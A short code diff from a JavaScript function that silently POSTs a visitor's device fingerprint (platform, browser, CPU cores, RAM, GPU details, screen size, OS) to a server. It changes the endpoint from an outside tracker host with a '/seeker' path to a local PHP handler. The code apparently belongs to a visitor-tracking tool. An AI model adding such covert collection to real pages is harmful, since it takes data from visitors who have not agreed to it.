@@ -77,7 +77,7 @@ function information() {
   //
   $.ajax({
     type: 'POST',
-    url: 'https://diy-tracker.onrender.com/seeker',
+    url: 'info_handler.php',
     data: { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ven: ven, Ren: ren, Ht: ht, Wd: wd, Os: os },
     success: function () { },
     mimeType: 'text'
